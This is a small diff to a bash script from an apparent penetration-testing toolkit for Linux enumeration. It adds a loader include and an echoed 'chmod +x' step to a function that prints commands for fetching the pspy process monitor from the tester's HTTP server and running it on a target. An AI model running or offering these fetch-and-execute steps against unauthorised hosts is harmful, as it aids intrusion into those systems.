@@ -1,6 +1,7 @@
 #!/bin/bash
 SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
 source $SCRIPTDIR/general.sh
+source $SCRIPTDIR/loaders.sh
 
 linux_enumeration_auto() {
     echo 'Linux Manual Enumeration'
@@ -98,6 +99,7 @@ download_pspy() {
     echo "./$pspy_file"
     compile_loader
     if [[ ! -z $loader_file ]]; then
+        echo "chmod +x $loader_file"
         echo "./$loader_file http://$http_ip:$http_port/$pspy_file"
     fi
-}
+  }
